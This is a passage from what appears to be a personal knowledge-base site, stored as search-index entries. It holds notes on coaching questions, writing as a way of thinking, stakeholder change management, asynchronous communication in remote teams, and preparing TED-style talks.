maximize their potential. Coaching is goal-oriented, collaborative, and focused on the client\u0026rsquo;s strengths and future aspirations.\nWhat It Is Not # It is not therapy or counseling, which deal with resolving past issues and emotional problems, nor is it consulting, where the expert provides specific solutions and advice.\n\u0026ldquo;The Coaching Habbit\u0026rdquo; # This is a coaching strategy by Micheal Bungay Stanier, based on 7 type\u0026rsquo;s questions to use during coaching. This strategy is more for coaching people around you and help them, rather than helping someone progress in their career or such. Nevertheless, many of these questions are reusable tools for communicating and coaching in general.\nTell less and ask more. Your advice is not as good as you think it is.\nALWAYS LISTEN TO THE ANSWERS\nThe Kickstart Question: \u0026ldquo;What\u0026rsquo;s on your mind?\u0026rdquo; This turns your conversation into a real conversation. If you know what other question to ask, ask it, kickstart the conversation. Lead with \u0026ldquo;Out of curiousity\u0026rdquo; if you must, it lessends the heaviness of a question if necessary. The AWE Question: \u0026ldquo;And What Else?\u0026rdquo; You can ask it multiple times. This triggers to explore more options (insteado f shoulld we do this or not) Often results in better options Tames your advice monster (that urge to give advice) Buys you time to figure out more about the situation \u0026ldquo;There is is nothing else\u0026rdquo; is the response that shows success, all options are explored. Also, too many options are neither productive, but this line of questioning at least explores alternatives. If energy drains, then move on. Use this question with other questions to keep probing till you get to the bottom. The Focus Question: \u0026ldquo;What\u0026rsquo;s the real challenge here for you?\u0026rdquo; Often when people lay out a challenge, its not the actual problem. This allowes to probe deeper. Cause if the actual problem is not identifed we often end up solving the wrong problem or nothing at all. Slows down the rush to action, and forces focus. \u0026ldquo;For You\u0026rdquo; is important part of the question, as it focusses on the development of the individual. The Foundation Question: \u0026ldquo;What do you want?\u0026rdquo; The Lazy Question: \u0026ldquo;How can I help?\u0026rdquo; Don\u0026rsquo;t offer or tell what you should do to help, they need to formulate this. Delivery matters, if you are worried, you can soften it with: \u0026ldquo;Out of curiousity\u0026hellip;\u0026rdquo; \u0026ldquo;Just so I know\u0026hellip;\u0026rdquo; \u0026ldquo;To help me understand better\u0026hellip;\u0026rdquo; \u0026ldquo;To make sure that I\u0026rsquo;m clear\u0026hellip;\u0026rdquo; If they ask something you cant/wont do: \u0026ldquo;I can\u0026rsquo;t do that\u0026hellip; but I could do \u0026rdquo; if you are not comfortable to just say no. \u0026ldquo;Let me think about that\u0026rdquo; if you need some time before saying yes or no. Be cautious to not now switch to the \u0026ldquo;rescuer\u0026rdquo; habbit The Strategic Question: \u0026ldquo;If you\u0026rsquo;re saying yes to this. what are you saying no to?\u0026rdquo; It is easy to say \u0026ldquo;YES\u0026rdquo;, but with this approach, you go a level deeper. You can use the 3P\u0026rsquo;s (People, Projects, Patterns) as guide to deliver things one says no to. It helps for people to not overcommit. The Learning Question: \u0026ldquo;What was most useful for you?\u0026rdquo; Helps reflection and people to really grow. Double loop learning, you fix it and then create a learning moment. Here the real connections are made and aha moments happen. Similar: \u0026ldquo;What did you learn?\u0026rdquo; \u0026ldquo;What was the key insight?\u0026rdquo; \u0026ldquo;What do you want to remember?\u0026rdquo; Reasons for this question: It assumes the conversation was usefull Asks people to identify the big thing that was most useful It makes it personal It givesy you (the coach) feedback It\u0026rsquo;s learning, not judgement It reminds people how useful you are to them Reasons To Coach # Decrease Overdependence: People can become dependent on you if you usually provide answers, with coaching you make them less dependend on your to find their answers and solutions. Making everyone more selfsufficient and growing. Now you are not the bottleneck anymore. Dont get overwhelmed: By making others selfsufficient, you get more time again and less workload. Become More Connected: You will be more connected to work that matters again and also with the poeople you have coached. 3P Method # Tips/Insights # These questions work via any communication channel Information retention is notourisly bad, so better to help building a habbit of finding answers instead. Get comfortable with silence after asking a question Actuall listen to the answer Acknowledge the answers you get like \u0026ldquo;nice\u0026rdquo;, \u0026ldquo;I like it\u0026rdquo;, \u0026ldquo;Fanastic\u0026rdquo;, \u0026ldquo;Goone One\u0026rdquo;, \u0026ldquo;Yes, Thats good\u0026rdquo;, and \u0026ldquo;mmm-hmmm\u0026rdquo;. Don\u0026rsquo;t offer advice, answers or a solution. Neither do this as rhetorical questions (\u0026ldquo;Have you thought of\u0026hellip;\u0026rdquo;) Only consider offering explitly an \u0026ldquo;idea\u0026rdquo; when you exhausted all the questions. Offer it as an option. Stick to questions that START WITH WHAT, \u0026ldquo;Why\u0026rdquo; can put someone on the defensive, and if you are not fixing the problem, you don\u0026rsquo;t need the backstory. The first 3 questions allow for a robust coaching conversation. Use these 3, combine, probe, and yuou can have a productive conversation. Ask 1 question at a time, and then be quit while waiting for the answer. \u0026ldquo;Coaching For Development\u0026rdquo; vs \u0026ldquo;Coaching For Performance\u0026rdquo; Coaching For Performance: Addressing a specific challenge/problem. Coaching For Development: Foussing to the person who is dealing with the challenge/problem. 3P Method: Choose what to focus on in a coaching session. Which aspect of the challenge/problem might be at the heart of the problem? Projects: What is being worked on. People: The relationship and your role in it. Patterns: Behaviour or ways of working. You can say \u0026ldquo;There are these 3 facets we can look at\u0026hellip; \u0026hellip; Where should we start?\u0026rdquo; and then you can pull in the different facets as you go. Manfred Max-Neef describes 9 universal needs (for question 4) Affection Creation Recreation Freedom Idenity Understanding Participation Protection Subsistence Some of these questions could be effective for facilitation activities. As facilitator you are also trying to be distant from the content and more focussed on guiding the thought process. Examples # What is your number one issue, and how would you fix it? And donât make comments, just listen. Resources # Book: The coaching Habit "},{"id":9,"href":"/communication/","title":"Communication","section":"","content":" Communication # A wealth of information creates a poverty of attention (Hebert Simon, Nobel laureate and PhD in computer science and organization psychology)\nThe single biggest problem with communication is the illusion that it has taken place.\nWhat I need to know is how your work connects to everything else. Can you explain the essence of it in any way I understand? Can you share your work process in layman\u0026rsquo;s terms? Can you explain why it matters? And why you are passionate about it? If you can do this, you will expand my worldview. And you may do something else. You may spark new creativity or inspiration in me., Every of knowledge is different, but they are all connected.\nChange Management Modes Presenting Propaganda Writing General # Although writing is most commonly thought of as a way of expressing thoughts that we have already formed, it is also an excellent tool for discovering and clarifying thoughts.\nArt of thinking, p15 Most people die vague about life and death \u0026hellip; We imagine other people know definitely their own minds about things important to them and around them. but it is not so, we live in perpetual vagueness \u0026hellip;\nArt of thinking, p15 Solution: Freewriting It consists of focusing on a problem or issue, letting your mind produce whatever assosciations it will and writing down the resulting ideas, without pausing to evaluate any ideas (lets you shut off ideas prematurely). This writing is not intended to be shared, so there are no rules of composition and such. Insights # Exploratory teaches and helps you to think more critically and clearly, cause it improves your \u0026ldquo;way of thinking\u0026rdquo;, how you get there. Teaching you often more and broader on a subject matter. You might naturally also take social implications into account when writing about a scientific invention. Writing code is the same mental process. You make something work (e.g. Make a test pass) You refactor towards cleaner code. You run the tests again to make sure they pass. You iterate As you iterate, you get more clarity how it all fits together, you structure, you process. Programmers are non-fiction writes. Rubber Ducking: As you try to explain a problem, you need to clarify your thoughts about the problem, so you can express them clearly. Often, you will find the answer yourself through this process of clarifying your thoughts. Any thought process works better by writing. Write your journey through the process, clarifying your thoughts. You can reread your thoughts and improve them. If you focus on clarification and simplification, you will get a better understanding. Examples: RFC, Research, Design Document, Diary, Journal, Architecture Proposal, Presentation, Blogging Writing an email in particular benefits from this: Any additional back-n-forth communication that is required due to unclarity, is exhausting. People that blog often, do write clear ones, often have a good understanding of things, through the process of writing a good blog post. Those who do not try effort in improving and simplifying their writing, yet write a lot, will not grow. The more you embrace the process of writing well, the more clear your thoughts become. Shorter writing does not mean shorter time to work on it (\u0026ldquo;If i had more time, i would have written a shorter letter\u0026rdquo;). President Woodrow Wilson on how long it takes to prepare a speech: It depends on the length of the speech If it is a 10 minute speech, it takes me all of 2 weeks to prepare it If it is half hour, it takes me a week If I can take as long as I want to, no preparation at all. I\u0026rsquo;am ready now. Knowledge is stored in the human\u0026rsquo;s mind is multidimensional, hierarchical and cross linking. When talking or speaking, we convert that knowledge into a one dimensional stream of words. That\u0026rsquo;s why, when talking/writing it is important to be linear and and cross link where necessary to avoid ambiguity, certain links are not obvious to the receiver. In the book about Reasoning they the following remark which fits in quite nicely First, the emphasis on communication, on the crucial importance of the social activity of reasoning, means that we can scarcely afford any jargon at all.\nThe Iterative Thought Process # A self defined process based on my insights on becoming a more clear thinker.\nThe \u0026ldquo;The Iterative Thought Process\u0026rdquo; is a more generic version of this. You guide your brain, you structure your thoughts through different mediums (writing, drawing, visualizing, \u0026hellip;). Writing happens to be one of them that works quite well. Visual Methods: Miro board, mind map, Business Model Canvas, Value Proposition Canvas, KanBan Board, \u0026hellip; Key is to have a way to \u0026ldquo;Annotate\u0026rdquo; or \u0026ldquo;Visualize\u0026rdquo; concepts and thoughts and their relations (just like a system) so you can offload it all. Then you can review it, restructure, simplify, prune, do all the usual iterative steps to improve your thoughts and understanding. Steps: Offload your thoughts (all of partially) Structure (relations between them) Prune Review Iterate By offloading, it allows us to reflect on it, and work on it, however, most just offload and keep at that. By offloading, you create room for other thoughts and reflection, play with all elements. By offloading, you can focus on subparts of the whole topic. Did you know that your brain uses a constant amount of energy? Thinking harder, doesn\u0026rsquo;t result in using more energy. That\u0026rsquo;s why, when you focus, other things go to the background. Taking that fact in account, knowing the energy supply is constant, you can offload your thoughts, so the spotlight can then focus on the individual elements and parts, without keeping the big picture in your head. When writing as a part of the thought process: Write in a way that they donât worry about beings criticized, it would damage/block their train of thoughts and ideas. Thatâs why a journal works so well. When coaching: During coaching a coach usually focusses on guiding questions (e.g. 5 WHY\u0026rsquo;s.) that help someone clarify someones existing thoughts or teaches them on how to think better, just like with Writing Across The Curriculim. Related Concepts # According to ChatGPT.\nCognitive Load Theory: This theory, developed by John Sweller, explores how human cognitive architecture handles information processing. It posits that learning is more effective when information is presented in a way that reduces unnecessary cognitive load, which aligns with the idea of refining and simplifying thoughts to enhance understanding and communication.\nIterative Design: In design fields, the iterative process involves repeated cycles of prototyping, testing, and refining a product or concept. This approach helps in gradually improving clarity and functionality, akin to refining thoughts or visualizations.\nMetacognition: This is the awareness and understanding of one\u0026rsquo;s own thought processes. Metacognition involves self-regulation of cognition through planning, monitoring, and evaluating, which can include refining and rephrasing thoughts for better clarity.\nVisual Thinking: This is a way to organize your thoughts and improve your ability to think and communicate through visual means. Techniques such as mind mapping, sketching, and diagramming are used to clarify and simplify complex ideas.\nInformation Design: This field focuses on presenting information in a way that is most effective for understanding. It includes principles of clarity, simplicity, and the reduction of unnecessary complexity, often achieved through visual means.\nClarity in Communication: The process of rewriting or rephrasing thoughts to enhance clarity is a fundamental principle in communication studies. Techniques from this field are often employed to ensure messages are clear, concise, and effective.\nRhetoric # By investigating the rhetoric the writer or the reader can better understand the other, which might help to write a better document or to interpret it better. Helps also to understand what influences how a reader receives a message, which might be differ over time.\nWhat is the Writer\u0026rsquo;s Purpose ?\nAs a writer, understanding your purposes can help you in virtually every aspect of your writing process. What influences writers ?\nAs a writer, reflecting on your requirements and limitations can help you decide whether a particular decision-such as choice of topic or the inclusion of evidence from a particular type of source-will help or hurt your chances of accomplishing your purposes. What is the Reader\u0026rsquo;s Purpose ?\nAs a writer, understanding the purposes of your readers can help you create a more effective document. What influences readers ?\nWriters who do not take their readers\u0026rsquo; values and beliefs into account might miss an opportunity to create a more convincing, useful, or acceptable document. Readers\u0026rsquo; knowledge of a particular topic will also affect their reading of a document. When writers assume that readers know more about a topic than they actually do, they can create a document that is difficult to understand. When they assume their readers know less than they actually do, they risk creating documents that repeat information readers already know. In both cases, readers are likely to stop reading the document. What do Writers and Readers Know about Each Other?\nWhat is the Context?\nWAC: Rethoric\nHow to: Brief People # Whenever you need to thoroughly brief a group of people on an important matter, consider using a 5-paragraph format.\nSituation Is about what position weâre in, and why we set out to do what we want to do. You can break this down into three sub-points, like the customerâs situation, the situation of your own company, any extra help that is available, and the current market. Objective Is what we want to achieve. Plan Is how we want to achieve it. Logistics Is about what budget and resources are available, and how they are used. Communications Is about how youâll be coordinating among yourselves and with others in order to achieve your goal. TIP: Do a follow-up round (hours or days later) to ask for questions, good questions usually don\u0026rsquo;t come up on the spot. There are always questions.\nResources # Art Of Thinking by Vincent Ruggiero. On Writing Well: The Classic Guide to Writing Nonfiction by William Zinsser. Reasoning by Michael Scriven. Ted Talks: The Official TED Guide to Public Speaking by Chris J. Anderson. WAC: Writing Across The Curriculum Writing To Learn by Willian Zinsser. WAC: Rethoric Level Of Disagreement MIT Writing Process "},{"id":10,"href":"/communication/change-management/","title":"Change Management","section":"Communication","content":" Change Management # Mitigate or limit stakeholders to doubt # When a key stakeholder begins to express concerns after the initiative has already started rolling out, it\u0026rsquo;s essential to approach the situation delicately and strategically. Here are several techniques and approaches you can apply:\n1. Active Listening and Empathy # Listen carefully: Make sure you understand the specific concerns of the stakeholder. Even if they are not explicitly stated, pick up on the underlying emotions or fears. Show empathy: Acknowledge their feelings and validate their concerns. This helps build trust and opens up the conversation for deeper understanding. 2. Clarification and Inquiry # Ask open-ended questions: Encourage the stakeholder to elaborate on their concerns. For example, \u0026ldquo;Can you help me understand which aspects of the initiative are causing you concern?\u0026rdquo; Seek specifics: Gently probe to get more concrete examples or evidence behind their concerns, especially when they mention that other stakeholders might feel the same. This will help you determine whether this is a widespread issue or an isolated case. 3. Stakeholder Engagement # Conduct a pulse check: Consider doing a quick, informal survey or one-on-one conversations with other stakeholders to gauge their opinions and feelings about the initiative. This will help you understand if the concern is widespread. Hold a meeting: Organize a follow-up meeting with key stakeholders to discuss progress, address concerns, and reinforce the initiative\u0026rsquo;s value. This allows everyone to voice their opinions and feel included in the process. 4. Reassurance and Communication # Reiterate the benefits: Remind the stakeholder of the initiative\u0026rsquo;s goals and benefits, emphasizing how their input has shaped the project. Show how the initiative aligns with broader organizational objectives. Highlight progress: Share any early wins or positive outcomes that have resulted from the initiative so far. This can help reassure them that things are on the right track. 5. Addressing Concerns Head-On # Offer solutions: If the stakeholder\u0026rsquo;s concerns are valid, discuss possible adjustments or solutions. Showing flexibility and willingness to adapt can help mitigate their hesitation. Involve them in problem-solving: Engage the stakeholder in finding solutions to the issues they raised. This increases their sense of ownership and commitment to the initiative. 6. Build Consensus # Leverage allies: If other stakeholders are strongly supportive, consider leveraging their influence to build consensus and address any collective concerns. Collaborative decision-making: Ensure that any decisions about moving forward involve input from all key stakeholders. This can reduce the feeling of isolation and increase buy-in. 7. Document and Follow Up # Document the conversation: Keep a record of the concerns raised, the discussions that took place, and any agreed-upon actions. This creates a reference point and shows that the issue is being taken seriously. Follow up: After addressing the concerns, follow up with the stakeholder to see if their feelings have changed. This ongoing communication reinforces their importance in the process. 8. Evaluate and Adapt # Review the initiative: If the concerns are significant, it might be worth re-evaluating certain aspects of the initiative to ensure it\u0026rsquo;s still on track to meet its goals. Adapt if necessary: Be willing to make changes based on stakeholder feedback. Flexibility can prevent small issues from becoming larger obstacles down the line. By applying these techniques, you can address the stakeholder\u0026rsquo;s concerns in a thoughtful and strategic manner, ultimately helping to keep the initiative on track while maintaining strong relationships with all involved parties.\n"},{"id":11,"href":"/communication/modes/","title":"Modes","section":"Communication","content":" Communication Modes # Much of this is inspired from Florian and findings regarding on how remote work can work.\nDictionary # contextualize: To give the broader or surround context or background of certain information that allows to better understand and interpret the information. Summarized Tips # Distributed teams are better than localized teams â not because theyâre distributed, but because theyâre asynchronous. Avoid anything that makes a distributed team run synchronously. Use less chat. Have fewer meetings. Write. Things. Down. Remote Work # If you want to make remote work, work, you must learn how remote work can work. It won\u0026rsquo;t succeed when sticking to old habits that are not compliant with remote work. For remote work to succeed, you must adopt and new skills to make it work.\nWorking in a distributed team means working asynchronously. Being productive in a distributed team is a skill that most people must learn; it is not innate to us. Nothing has as dire an impact on productivity as poor communications. A capable distributed team habitually externalizes information.\nInformation is generally far less useful when it is only stored in one personâs head, as opposed to being accessible in a shared system that everyone trusts and can use. If you take important information out of your own head and store it in a medium that allows others to easily find and contextualize it, thatâs a win for everyone.\nWiki\u0026rsquo;s should be your default mode of communication in remote or distributed teams. That does not use any other method at all. You should be clear that Asynchronous communication is norm in this situation.\nClear rules on how to communicate does a long way.\nTypes # Chat/IM # Synchronous/Asynchronous Communication, but best for Synchronous. Often the norm (especially in remote/distributed work). Excessively using chat isnât being efficient. Itâs being lazy. It\u0026rsquo;s easy: Fire and forget Difficult to find information after the fact. Even harder to grasp the whole context around the information you search for. If this creates an expectation for others to respond quickly, it is very bad. Use for: Collaboration that requires immediate, interactive mutual feedback and confidentiality from 2 or more participants. Good for actual Synchronous communication. Using chat in distributed team should be an exception to the norm. Requirements: You need immediate feedback from the other person, you need mutual back-and-forth with the other person, you donât want others to follow the conversation. If you need interactive and immediate feedback, chances are that youâre working on something urgent, and it is far more likely youâll eventually need to poll other opinions. Just use a shared channel from the get-go. Pinging (like mentioning them) Same as walking up to someone and ask a question, people will feel compelled to answer promptly, no matter where it is your intention or not. Unless they are so used to it and ignore you. You probably broken their train or thoughts, keeping or interrupting them from doing productive work. Avoid \u0026ldquo;Empty or naked Pings\u0026rdquo; Pinging with just ping or how are you? or can I ask a question?. Better to just be direct Can I get your eyes on this pull request \u0026lt;insert link\u0026gt;. Be explicit if something is not urgent. See also this post, if someone responds to your ping later, you might be focused, be interrupted yourself and even forgotten what it was about. Email # Asynchronous Communication Easier to share with a person or group. Harder to loop people into an ongoing discussion after the fact. Still hard to find information, although you marginally better than chat, because of its threading. Wiki # Asynchronous Communication Very easy to share, find and contextualize information (given view permissions are open). Wiki means any CMS meant to document and share. Issue Tracker means any Jira, ADO, \u0026hellip; Video Calls # Synchronous Communication Sharing information works, but does not scale. It\u0026rsquo;s in everyone\u0026rsquo;s mind, not written, hard to access later. Sharing recording doesn\u0026rsquo;t allow for easy discovery of information, nor fast consumption. Unless the automated transcription, proper summarization by GenAI and then storage of that information is on point. Until machines get intelligent enough to automatically transcribe and summarize words spoken in a meeting, write notes and a summary of every meeting you attend, and circulate them. They give you the ability to pick up on non-textual and nonverbal cues from the call participants. But thatâs really the only good reason to use them. Needs an agenda, if you don\u0026rsquo;t share this in advance, you are setup for ineffective meetings. Have a purpose Document the meeting Document the outcomes The record of the call is more important, else it does not scale to other people or for later reference. To be useful, the write-up of a call takes more time and effort than the call itself. This challenges the notion of a \u0026ldquo;Video Call\u0026rdquo; being less work. It\u0026rsquo;s less work if you\u0026rsquo;re lazy about it and don\u0026rsquo;t want or need to contents of it. Outline Meeting title Date, time, attendees Summary Discussion points (tabular) Action items [Optional] executive summary, allows people to decide if they should familiarize themselves with what was discussed, immediately, and possibly respond if they have objections, or only want to be aware of what was decided, or just keep in the back of their head that a meeting happened, that notes exist, and where they can find them when they need to refer back to them. Once you do meetings right, you no longer need most of them. If you follow this, you might decide that a collaborative document works better. When to use it? Recurring meetings as opportunity to feel the pulse of the team. Obviously, a distributed team has few recurring meetings, because they are synchronization points, and weâve already discussed that we strive to minimize those. So the idea of having daily standups, sprint planning meetings, and sprint retrospectives is fundamentally incompatible with distributed teams. having perhaps one meeting per week (or maybe even one every two weeks) in a video call is useful for being able to pick up on nonverbal clues like body language, posture, facial expressions, and tone. These meetings are less about getting work done and more about syncing emotionally and picking up non-verbal cues. Synchronous vs Asynchronous # Synchronous requires all participants to be available at the same time. Meaning, calendars need to be aligned, meetings might be in the middle of someone\u0026rsquo;s \u0026ldquo;focus\u0026rdquo; time, others need to\u0026hellip; It has many ripple effects and comes with a lot of overhead. Asynchronous requires improving your writing skills to communicate clearly. Asynchronous is the norm in distributed teams. Water cooler talk # If 90% of your companyâs knowledge is only in peopleâs heads, youâre dead without the lunchroom. There must be a habit of externalizing information if you work as a distributed team. The water cooler works well when people work in the same room, yet they depend on others for access and discovery. Externalizing helps significantly. If you have a team thatâs functional and productive, because it habitually externalizes information, the absence of chit-chat over coffee has zero negative impact on information flow. People working in distributed teams are often introverts. Or they simply choose to have their social relationships outside of work. Extravert in distributed teams # All you need to do is agree on a signal that means âIâm taking a break and Iâd be happy to chat with anyone whoâs inclined, preferably about non work related thingsâ (or whatever meaning your group agrees on). It could fail for the simple reason that almost no one never took breaks that happened to overlap. So it might not work for all. You can have a channel in which you can discuss completely random things that are not work related. Externalization of Information # By adapting modes of communication that requires to externalize information (habitually especially) you will bear the fruits that come with clear thinking as I laid out in my blog post.\nChatOps # Might work well for Ops but not as generic communication approach for a team. Resources # https://xahteiwi.eu/resources/presentations/no-we-wont-have-a-video-call-for-that/ https://xahteiwi.eu/devopsdaystlv-2019/#/ https://blogs.gnome.org/markmc/2014/02/20/naked-pings/ "},{"id":12,"href":"/communication/presenting/","title":"Presenting","section":"Communication","content":" Presenting Ideas \u0026amp; Talks (TED) # TED is about sharing ideas in an interconnected world. Ideas worth sharing. Ideas that connect.\nMany of the general tips, process and structure of Explanatory writing are applicable. As with many things, test your talks Talk styles to avoid: The sales pitch Ramble/Complain/Rant and being under prepared The org bore: No one cares about your org unless you work there Inspiration Performance: Only present because of ego and to \u0026ldquo;inspire\u0026rdquo;, inspiration is a byproduct of a great presentation. Did you know about communication: 7% is words, 38% Tone, 55% body.\nTalk Tools # Body Language / Tone # Personas # You can use this personas to switch between or stick to, they come with their own tone and body language.\n1 Word At a time: Say more with less, say a single word and give is space and time. Preacher: High energy, you ask engagement of the audience (can I get a hell yeah? Might even push for it.) Exaggerated body language, very energized. You keep building up energy. Cowboy: Confident stand and language, stand even on both legs, shoulders up. Calm talk, but a bit cheeky of subtle jokes to avoid becoming arrogant. Needs a gentle play. Connection # Make eye contact Show vulnerability Make em laugh - but not squirm Park your ego Tell a story Avoid politics Narration # Use story telling instead of just summarizing facts, we do this as a species for thousands of years, you love it. It helps you connect. Tips Built it on a character your audience can empathize with. Built tension through curiosity, social intrigue or actual danger. Offer right level of detail. Too little and it\u0026rsquo;s not vivid, too much and it gets bogged down. End with satisfying resolution, being funny, moving or revealing. Execution matters It has to be true Don\u0026rsquo;t overshare, if you share intimately, have worked through it Parables are nice Explanation # Example of a good explanation Step 1: Start right where you are, ground it\u0026hellip; Make it relevant to us,\u0026hellip; Step 2: Create curiosity Step 3: Introduce concepts on by one Step 4: Use metaphors Step 5: Use examples Explanations should be linear, built up, and if possible, use a structure that invites the receiver to become curious. Be weary of \u0026ldquo;curse of knowledge\u0026rdquo;, make sure you don\u0026rsquo;t over or under assume what the audience knows. Don\u0026rsquo;t want to offend their intelligence, but neither intimidate them with expecting they know everything you talk about. Consider making clear what your idea \u0026ldquo;isn\u0026rsquo;t\u0026rdquo; which can manage expectations and clarify already things. (e.g. mindful eating does not require you to learn meditation.) If you explain well, you can generate also excitement about your idea. Persuasion # Short Persuasion is the act of replacing someone\u0026rsquo;s worldview with something better. And at its hears is the power of reason, capable of long-term impact. Reason is best accompanied by intuiting pumps, detective stories, or other plausibility-priming devices. Means convincing the audience that they way they currently see the world isn\u0026rsquo;t quite right. First: Take down the parts that aren\u0026rsquo;t working well Second: Rebuild something better Last: An upbeat statement or some conclusion of sorts? Example: People on a social media diet assumes the world is full of constant violence. This is wrong, shows data on that violence only has been decreasing. Then remind how cruel history was and some of the ages. Then, show how modern media has incentive to lead with stories of drama, regardless if they\u0026rsquo;re representative or not. Showing how we might overestimate the levels of violence. And create perceptive, the total number is not relevant, but the CHANCE you experience violence. And then ending with \u0026ldquo;Don\u0026rsquo;t just ask what we do wrong? But also, what are we doing right?\u0026rdquo; Based on \u0026ldquo;The better angels of our nature\u0026rdquo; by Steven Pinker and his TED talk. Priming is important. Don\u0026rsquo;t start with the end conclusion, which can sound so unlikley and a far reach. Follow the above steps and prime the audience. On step at a time, go through the journey and prime the idea. Use Intuition Pumps Example through story the audience\u0026rsquo;s intuition can \u0026ldquo;tell\u0026rdquo; where the story is going to (remember the TED talk about too much choice makes you unhappier, as he tels about the experience of buying a jeans) Often instead of using (only) reasoned arguments, intuition pumps are more powerful, that\u0026rsquo;s very common in philosophy. We nudge the audience in our direction. Reasoned arguments in itself are also good tools Reasoned Arguments IF/THEN: If X is true, then clearly Y follows (Because X implies a Y) Break down into small steps, thought steps, and then apply the IF/THEN approach to build buy in and agreement from the audience along the journey, with each small step. See TED Talk Dan Pallota Reductio ad absurdum](https://iep.utm.edu/reductio/): a mode of argumentation that seeks to establish a contention by deriving an absurdity from its denial Take the \u0026ldquo;counter position\u0026rdquo; to what you\u0026rsquo;re arguing and showing that it leads to contradiction. If that counter position is \u0026ldquo;false\u0026rdquo; it strengthens your position. Example on how we frown on high salaries for nonprofit leaders: \u0026ldquo;You want to make 50M selling violent video games to kids, got for it, we\u0026rsquo;ll put you on Wired, but you want to make 0.5M trying to cure kids of malaria, you\u0026rsquo;re considered a parasite yourself\u0026rdquo; See TED Talk Dan Pallota Effective, but handle with care, use it on issues, not people or opponents. Detective Story: Structure: The big mystery Travel the world for ideas in search of possible solutions Rule then out one by one Until one viable solution survives More than logic: Logic is a big part, but make it more human, there are some tools: Inject some humor early one Add an anecdote Offer vivid examples Recruit 3th party validation Use powerful visuals Revelation # Most direct way of gifting an idea to an audience ? Simply show it to them. Examples: show series of images of art project and talk through it demo product you invented Describe vision of self-sustaining city Show stunning photos from recent trip to Amazon jungle 3 Broad Categories of ways of showing things The wonder Walk: Succession of of images or \u0026ldquo;wonder moments\u0026rdquo;, you walk people through your journey. Each step is simple, from one piece to another with a sense of \u0026ldquo;wonder\u0026rdquo; Examples/tips: Artist doing a studio tour with revealing insights into each artwork As guide you go through a Hike in a dramatic terrain \u0026ldquo;If you liked that\u0026hellip; just wait till you see this!\u0026rdquo; \u0026ldquo;This next project took that idea and dialed it up by an order of magnitude\u0026rdquo; (instead of \u0026ldquo;Now we\u0026rsquo;ll turn to my next project) Typical For: Artists, Designers, photographers, architects, nature\u0026hellip; basically if its very visually driven (can be even science) The dynamic demo: It\u0026rsquo;s not just visual, one needs to see it working. A good structure: An initial tease Necessary background, context and/or the invention story. The demo itself (the more visual and dramatic the better, so as long you are not faking it) The implications of this technology The dreamscape: Share a future vision/dream The more actionable, the better. It can incentivize the audience. Mix \u0026amp; match from all categories if you want! Preparation # Visuals # You might not use any visuals or slides at all. That\u0026rsquo;s ok based on the content type.\nConsider a black empty slide, when you want to draw attention back to you till next slide is ready to show. Key elements for strong visuals fall into these categories: Revelation Images/visuals Consider silence for people to take it in Fill screen You can prime the audience before showing, but you can be also a bit more dramatic if it makes sense to do so. Explanatory Power Sometimes best to tell is to show Limit slide to a single core idea Caution to put too much in a single slide/visual when explaining Consider to build up, or visually filter/hide things, so the focus of the audience is guided and focused and doesn\u0026rsquo;t need to \u0026ldquo;process\u0026rdquo; a visual to catch up. Example: A chart, highlight the data points that are relevant, grey out the other less relevant ones or such. Aesthetic Appeal Key Elements Software PowerPoint (Microsoft) Keynote (Mac) Prezi Make sure your software can be used on the presentation. Fonts One typeface per presentation Recommendation: Medium-weight sans-serif fonts (e.g. Helvetica or Arial) Thin fonts are hard to read, especially on black backgrounds Size: Use 24 points or larger. Max 3 sizes (Title, main idea, supporting ideas) Background: Use a background if you put font on a photo Color: Simple and contrast! One color per presentation (unless for surprise or emphasize) Never use light color on light color background Never use dark color on dark color background Legibility Test on a screen from a distance on how legible fonts and images are What not to do Bullet points Dashes Underlining and italics, bold is OK Drop shadows Multiple effects in single line Explanations and diagrams: Keep it simple and give time to take it in Photos Full screen Black background Consider using \u0026ldquo;bleed\u0026rdquo; option to fit images Photo Credits: If necessary, top right corner horizontal if possible of the image Can also just mention once at the start \u0026ldquo;All rights to\u0026hellip; Photos courtesy of \u0026hellip;\u0026rdquo; to avoid repetition Keep the names short, no need to mention department or whatever. No more than 10 points Pictures of you \u0026amp; team Don\u0026rsquo;t Videos High quality Make sure sound is tested Transitions None \u0026gt; Announces next topic/idea Dissolve \u0026gt; Within a topic/idea Keep it to minimum Rights/license: Make sure all licenses are in place Testing : Test Transport: Always take copy on USB stick, good exporting. Scripting # Everyone has their flavour\nScripted Talk: Write out the talk in full as a complete script (to be read, memorized or both) Risk: Audience feels \u0026ldquo;being read to\u0026rdquo; Remember: You are writing for \u0026ldquo;spoken language\u0026rdquo; Process: First you will sound convincing, unstructured as you rehearse Secondly you start to know the whole talk but sound more robotically (uncanny valley) Third (if you keep going) You really start to know the talk and you can inject your liveliness in again. Takes a process of a week-ish Avoid reading the script unless you only caption images or your are such a writer everyone is expecting this. Unscripted Talk: Have a clearly worked-out structure and speak in the moment to each of your points Risk: Blabbering, unstructured, unfocussed Suddenly can\u0026rsquo;t find the right words in the moment You leave out something crucial You overrun your time slot Rehearse well! Rehearse # Rehearse is a must and works well. Notice, by rehearsing from day one, you can follow the Iterative Thought Process of pruning, refining, improving your talk.\nOpening \u0026amp; Closing # Start Strong Deliver a dose of drama Your first words really do matter. \u0026ldquo;Sadly, in the next 18 minutes \u0026hellip; 4 Americans that are alive will be dead \u0026hellip; through the food that they eat\u0026rdquo;. \u0026ldquo;I am not drunk \u0026hellip; but the doctor who delivered me was\u0026rdquo; (Zayid who has cerebral palsy die to botched medical procedure at birth) Ignite Curiosity A talk on parasites might sound dull, but you can lead with curiosity: A heard of wildebeest, a shoal of fish, a flock of birds. Many animals are in large groups that are among the most wonderful spectacles in the natural world. But why do these groups form? The common answers include things like seeking safety in numbers or hunting in packs or gathering to mate or breed, and all of these explanations, while often true, make a huge assumption about animal behavior, that the animal are in control of their own actions, that they are in charge of their bodies. And that is often not the case.\nHow did this fourteen-year-old girl, with less than $200 in her ban account, give her whole town a giant leap into the future?'\nCreate questions that create a knowledge gap that the brain fights to close. And they can to that only by listening hard to what you have to say. Show a compelling slide, video, or object Something impactful or intriguing Tease, but don\u0026rsquo;t give away Over the next few minutes I plan to reveal what I believe is the key to success as an entrepreneur, and how anyone can cultivate it. You\u0026rsquo;ll find clues to it in the story I\u0026rsquo;m about to tell\u0026rdquo;\nEnd Strong Don\u0026rsquo;t: \u0026ldquo;Well, that\u0026rsquo;s my time gone, so I\u0026rsquo;ll wrap up here\u0026rdquo; Didn\u0026rsquo;t manage to prepare well enough? There is more ? \u0026ldquo;Finally, I just want to thank 